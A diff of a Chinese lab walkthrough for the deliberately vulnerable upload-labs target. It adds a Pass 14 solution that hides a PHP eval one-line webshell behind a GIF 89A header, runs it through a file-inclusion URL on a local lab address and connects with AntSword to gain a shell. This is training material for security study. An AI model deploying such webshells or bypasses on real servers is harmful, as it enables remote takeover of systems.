@@ -8,7 +8,8 @@
   + [Upload-labs靶场通关攻略(全网最全最完整)](https://blog.csdn.net/weixin_47598409/article/details/115050869)
   + [Upload-labs靶场通关笔记(含代码审计)](https://blog.csdn.net/weixin_54894046/article/details/127239720?ops_request_misc=%7B%22request%5Fid%22%3A%22170438292316800215095603%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170438292316800215095603&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-127239720-null-null.142^v99^control&utm_term=upload-labs通关&spm=1018.2226.3001.4187)
   + [upload-labs详解1-19关通关全解(最全最详细)](https://blog.csdn.net/qq_53003652/article/details/129969951?ops_request_misc=%7B%22request%5Fid%22%3A%22170636374116800222847150%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170636374116800222847150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-129969951-null-null.142^v99^pc_search_result_base4&utm_term=upload-labs通关&spm=1018.2226.3001.4187)
-
+  + [文件上传漏洞之upload-labs打靶笔记-CSDN博客](https://blog.csdn.net/m0_60716947/article/details/124608448?ops_request_misc=%7B%22request%5Fid%22%3A%22170758532616800180610738%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170758532616800180610738&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-23-124608448-null-null.142^v99^pc_search_result_base4&utm_term=upload-labs报错)
+  
 + 本地打开地址：<code>http://localhost/upload-labs</code>
 
 ## Pass 01
@@ -1276,3 +1277,133 @@ php的magic_quotes_gpc为OFF状态
 
 ### 方法一
 
++ 查看提示
+
+![Pass14_1](./img/Pass14_1.png)
+
+
+
++ 查看源代码
+
+![Pass14_2](./img/Pass14_2.PNG)
+
+
+
++ 编写脚本文件<code>FourteenFirstMethod.php</code>，在一句话木马前加上下面这句代码
+
+~~~ shell
+GIF 89A
+~~~
+
+![Pass14_3](./img/Pass14_3.PNG)
+
+
+
++ 上传脚本文件<code>FourteenFirstMethod.php</code>，由于上一步代码的添加脚本文件<code>FourteenFirstMethod.php</code>会被解析为<code>gif</code>文件
+
+![Pass14_5](./img/Pass14_5.PNG)
+
+![Pass14_6](./img/Pass14_6.PNG)
+
+
+
++ 右键打开上传的脚本文件<code>FourteenFirstMethod.php</code>，然后复制打开文件对应的网址
+
+![Pass14_7](./img/Pass14_7.png)
+
+![Pass14_8](./img/Pass14_8.png)
+
+
+
++ 要利用文件包含漏洞写一个<code>include.php</code>传入再解析图片才能执行木马，在这里打开文件包含漏洞链接
+
+![Pass14_9](./img/Pass14_9.png)
+
+
+
++ 重新构造<code>URL</code>，在文件包含漏洞的网址后加上传图片马的网址
+
+~~~ shell
+http://192.168.104.55:8080/upload-labs/include.php(文件漏洞)?file=upload/2620240211021030.gif(图片马)
+~~~
+
+![Pass14_10](./img/Pass14_10.png)
+
+
+
++ 最后回车，代码成功执行
+
+![Pass14_11](./img/Pass14_11.PNG)
+
+
+
+### 方法二
+
++ 编写脚本文件<code>FourteenSecondMethod.php</code>，在一句话木马前加上<code>GIF 89A</code>
+
+~~~ shell
+GIF 89A
+<?php @eval($_POST['FourteenSecond']); ?>
+~~~
+
+![Pass14_4](./img/Pass14_4.PNG)
+
+
+
++ 上传脚本文件<code>FourteenSecondMethod.php</code>
+
+![Pass14_12](./img/Pass14_12.PNG)
+
+
+
++ 由于第一步加上的代码<code>GIF 89A</code>，上传的文件<code>FourteenSecondMethod.php</code>会被解析为<code>GIF</code>文件
+
+![Pass14_13](./img/Pass14_13.PNG)
+
+
+
++ 右键打开<code>GIF</code>文件
+
+![Pass14_14](./img/Pass14_14.png)
+
+
+
++ 复制打开<code>GIF</code>文件网址
+
+![Pass14_15](./img/Pass14_15.png)
+
+
+
++ 利用文件包含漏洞
+
+![Pass14_16](./img/Pass14_16.png)
+
+
+
++ 重新构造<code>URL</code>，文件包含漏洞网址后加上图片马的文件位置
+
+~~~ shell
+URL=http://192.168.104.55:8080/upload-labs/include.php(文件包含漏洞)?file=upload/2620240211021030.gif(图片马位置)
+~~~
+
+![Pass14_17](./img/Pass14_17.png)
+
+
+
++ 回车，文件成功执行
+
+![Pass14_18](./img/Pass14_18.PNG)
+
+
+
++ 打开蚁剑，添加配置数据如下，URL地址为文件包含漏洞网址后加图片马的文件位置，连接密码根据图片马而设置
+
+![Pass14_20](./img/Pass14_20.PNG)
+
+
+
++ 配置数据后连接成功，成功<code>getshell</code>
+
+![Pass14_19](./img/Pass14_19.PNG)
+
+![Pass14_21](./img/Pass14_21.PNG)
